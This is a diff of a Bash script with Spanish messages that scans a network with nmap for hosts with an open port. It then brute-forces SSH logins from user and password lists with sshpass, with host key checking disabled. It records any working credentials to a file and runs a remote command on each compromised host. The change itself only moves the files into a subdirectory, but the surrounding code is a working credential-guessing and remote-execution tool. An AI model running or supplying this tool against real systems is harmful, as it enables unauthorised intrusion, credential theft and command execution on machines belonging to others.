@@ -34,9 +34,9 @@ then
         exit
 fi
 
-if [[ ! -f users.txt ]] || [[ ! -f passwords.txt ]]
+if [[ ! -f files/users.txt ]] || [[ ! -f files/passwords.txt ]]
 then
-        touch users.txt passwords.txt
+        touch files/users.txt files/passwords.txt
         echo "Debes escribir al menos un usuario y una contraseña en los ficheros users.txt y passwords.txt."
 fi
 
@@ -45,10 +45,10 @@ clear && echo "Comprobando equipos de la red $Network con el puerto $Port abiert
 for IP in $(nmap -n -Pn $Network -p$Port -oG - | grep '/open/' | awk '/Host:/{print $2}')
 do
         echo "Se han escaneado todas las posibles IPs."
-        for User in $(cat users.txt)
+        for User in $(cat files/users.txt)
         do
                 echo "> Probando usuario $User."
-                for Password in $(cat passwords.txt)
+                for Password in $(cat files/passwords.txt)
                 do
                         echo ">> Probando contraseña $Password."
                         sshpass -p $Password ssh $User@$IP -o StrictHostKeychecking=no exit 2>/dev/null
@@ -56,7 +56,7 @@ do
                         if [ $Success -eq 0 ]
                         then
                                 echo -e "${Green}Se ha podido entrar a la IP $IP con $User y la clave $Password.${NC}"
-                                echo "$IP:$User:$Password" > acccess_granted.txt
+                                echo "$IP:$User:$Password" > files/acccess_granted.txt
                                 sshpass -p $Password ssh $User@$IP -o StrictHostKeychecking=no "$ComandoRemoto" 2>/dev/null
                                 break
                         else
